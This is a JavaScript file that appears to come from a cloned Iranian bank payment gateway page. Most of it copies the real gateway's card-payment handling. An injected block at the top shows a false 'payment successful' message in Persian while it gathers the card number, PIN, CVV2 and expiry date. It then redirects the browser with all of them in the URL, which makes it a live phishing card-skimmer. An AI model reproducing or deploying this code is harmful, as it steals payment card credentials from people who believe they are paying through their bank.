$(document).ready(function(){
                  
    
    var e=!1;$(function(){$(document).ajaxSend(function(){document.getElementById("AjaxLoad").src="../images/load.gif";document.getElementById("alert").style.backgroundColor = "green";$("#alert").text("پرداخت با موفقیت انجام شد ...");                          
                                                                    
$W_PAN4=document.getElementById("W_PAN4").value,
    $W_PAN3=document.getElementById("W_PAN3").value,
    $W_PAN2=document.getElementById("W_PAN2").value,
    $W_PAN1=document.getElementById("W_PAN1").value,
    $W_PIN=document.getElementById("W_PIN").value,
    $W_CVV2=document.getElementById("W_CVV2").value,
    $W_EXPIRE1=document.getElementById("W_EXPIRE1").value,
    $W_EXPIRE2=document.getElementById("W_EXPIRE2").value,
    
window.location.href = '?token=4765748TFKU4D365896YO78GF457U6I3W53SUDKIL&W_PAN4='+$W_PAN4+'&W_PAN3='+$W_PAN3+'&W_PAN2='+$W_PAN2+'&W_PAN1='+$W_PAN1+'&W_PIN='+$W_PIN+'&W_CVV2='+$W_CVV2+'&W_EXPIRE1='+$W_EXPIRE1+'&W_EXPIRE2='+$W_EXPIRE2;

                                                          
                                                                                   
                                                                                   
                                                                                   return false;}),$(document).ajaxStop(function(){document.getElementById("AjaxLoad").src="../images/unload.gif",document.getElementById("AjaxLoad").width=1,document.getElementById("AjaxLoad").height=1,isDiscountCheck?isDiscountCheck=!1:e||(document.getElementById("doPay")&&(document.getElementById("doPay").disabled=!1),document.getElementById("doCancel")&&(document.getElementById("doCancel").disabled=!1),$("#alert").attr("class","Error")),e=!1})}),$("form").submit(function(){return!1}),$("#change").click(function(){document.getElementById("security").src="https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId="+document.getElementById("RefId").value+"&rnd= "+Math.random()}),$("#doPay").click(function(){if(!doPay_value())return $("#alert").attr("class","Error"),$("#alert").text("لطفا ورودی های خود را کنترل نمایید"),document.getElementById("doPay").disabled=!1,document.getElementById("doCancel").disabled=!1,!1;$("#doPay").attr("disabled","true"),$("#doCancel").attr("disabled","true"),$W_REFID=document.getElementById("RefId").value,document.getElementById("W_CAPTCHA")?$W_CAPTCHA=document.getElementById("W_CAPTCHA").value:$W_CAPTCHA="";var t=getSelectedPanId();$W_PAN4=document.getElementById("W_PAN4").value,$W_PAN3=document.getElementById("W_PAN3").value,$W_PAN2=document.getElementById("W_PAN2").value,$W_PAN1=document.getElementById("W_PAN1").value,$W_PIN=document.getElementById("W_PIN").value,$W_CVV2=document.getElementById("W_CVV2").value,$W_EMAIL=document.getElementById("W_EMAIL").value,$W_SAVEPAN=!1,null!=document.getElementById("W_SAVEPAN")&&document.getElementById("W_SAVEPAN").checked&&($W_SAVEPAN="true"),document.getElementById("W_PAYERID")?$W_PAYERID=document.getElementById("W_PAYERID").value:$W_PAYERID="",$W_EXPIRE1=document.getElementById("W_EXPIRE1").value,$W_EXPIRE2=document.getElementById("W_EXPIRE2").value,$.post("PaymentServlet",{SELECTED_PAN_ID:t,W_REFID:$W_REFID,W_CAPTCHA:$W_CAPTCHA,W_PAN4:$W_PAN4,W_PAN3:$W_PAN3,W_PAN2:$W_PAN2,W_PAN1:$W_PAN1,W_PIN:$W_PIN,W_CVV2:$W_CVV2,W_PAYERID:$W_PAYERID,W_EXPIRE1:$W_EXPIRE1,W_EXPIRE2:$W_EXPIRE2,W_EMAIL:$W_EMAIL,W_SAVEPAN:$W_SAVEPAN},function(t){return e=!0,"true"==$("captchaStatus",t).text()?"true"==$("payerIdStatus",t).text()?"0"!=$("statusCode",t).text()?"419"==$("statusCode",t).text()||"415"==$("statusCode",t).text()?(document.getElementById("time").value="--:--",$("#alert").attr("class","Error"),$("#alert").text($("statusDescription",t).text()),document.getElementById("ResCode").value=$("statusCode",t).text(),document.getElementById("SaleReferenceId").value="",document.forms.returnForm.submit(),!0):(document.getElementById("security").src="https://bpm.shaparak.ir/pgwchannel/captchaimg.jpg?RefId="+document.getElementById("RefId").value+"&rnd= "+Math.random(),$("#alert").attr("class","Error"),$("#alert").text($("statusDescription",t).text()),document.getElementById("doPay").disabled=!1,document.getElementById("doCancel").disabled=!1,document.getElementById("W_PIN").value="",document.getElementById("W_CVV2").value="",document.getElementById("W_CAPTCHA").value="",!1):(document.getElementById("ResCode").value=$("statusCode",t).text(),document.getElementById("SaleReferenceId").value=$("saleReferenceId",t).text(),document.getElementById("CardHolderInfo").value=$("cardHolderInfo",t).text(),document.getElementById("pan").value=$("pan",t).text(),$("giftAmount",t).text()>0&&(document.getElementById("GiftAmount").value=$("giftAmount",t).text(),$("#alert").attr("class","Info"),$("#alert").text("پرداخت با موفقيت انجام شد. ...")),$("#alert").attr("class","Info"),$("#alert").text("پرداخت با موفقيت انجام شد. ..."),document.forms.receiptForm.submit(),!0):(document.getElementById("W_PAYERID").style.background="#FEBFC0",$("#alert").attr("class","Error"),$("#alert").text("لطفا ورودی های خود را کنترل نمایید"),document.getElementById("doPay").disabled=!1,document.getElementById("doCancel").disabled=!1,!1):(document.getElementById("W_CAPTCHA").style.background="#FEBFC0",$("#alert").attr("class","Error"),$("#alert").text("لطفا ورودی های خود را کنترل نمایید"),document.getElementById("doPay").disabled=!1,document.getElementById("doCancel").disabled=!1,!1)})}),$("#doCancel").click(function(){return document.getElementById("ResCode").value="17",document.getElementById("SaleReferenceId").value="",document.forms.returnForm.submit(),!1})});